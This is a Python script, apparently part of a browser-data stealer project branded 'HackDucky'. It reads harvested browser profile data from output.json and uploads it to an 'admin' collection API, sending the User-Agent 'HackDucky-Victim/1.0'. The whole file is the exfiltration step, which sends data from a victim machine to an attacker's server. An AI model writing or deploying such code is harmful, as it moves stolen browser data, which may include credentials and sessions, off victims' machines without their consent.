import json
import requests
import os
from typing import List, Dict, Any

class DataUploader:    
    def __init__(self, api_url: str = "http://localhost:8000/api/upload/"):
        self.api_url = api_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'HackDucky-Victim/1.0'
        })
    
    def upload_data(self, data: List[List[Dict[str, Any]]]) -> bool:
        try:
            profiles = []
            for browser_data in data:
                for profile_data in browser_data:
                    profiles.append(profile_data)
            
            payload = {
                'profiles': profiles
            }
            
            response = self.session.post(
                self.api_url,
                json=payload,
                timeout=30
            )
            
            if response.status_code == 201:
                result = response.json()
                print(f"Successfully uploaded {result.get('profiles_imported', 0)} profiles to admin")
                return True
            else:
                print(f"Upload failed: {response.status_code}")
                print(f"Response: {response.text}")
                return False
                
        except requests.exceptions.ConnectionError:
            print("Could not connect to admin API. Make sure the admin server is running.")
            return False
        except requests.exceptions.Timeout:
            print("Upload timed out. Check your network connection.")
            return False
        except Exception as e:
            print(f"Upload error: {str(e)}")
            return False
    
    def check_api_status(self) -> bool:
        try:
            status_url = self.api_url.replace('/upload/', '/status/')
            response = self.session.get(status_url, timeout=5)
            return response.status_code == 200
        except:
            return False

def upload_output_file(output_file: str = "output.json", api_url: str = "http://localhost:8000/api/upload/") -> bool:
    try:
        if not os.path.exists(output_file):
            print(f"Output file {output_file} not found")
            return False
        
        with open(output_file, 'r') as f:
            data = json.load(f)
        
        uploader = DataUploader(api_url)
        return uploader.upload_data(data)
        
    except Exception as e:
        print(f"Error uploading data: {str(e)}")
        return False

def main():
    import sys
    
    output_file = sys.argv[1] if len(sys.argv) > 1 else "output.json"
    api_url = sys.argv[2] if len(sys.argv) > 2 else "http://localhost:8000/api/upload/"
    
    print(f"Uploading {output_file} to {api_url}")
    
    if upload_output_file(output_file, api_url):
        print("Upload completed successfully")
        sys.exit(0)
    else:
        print("Upload failed")
        sys.exit(1)

if __name__ == "__main__":
    main()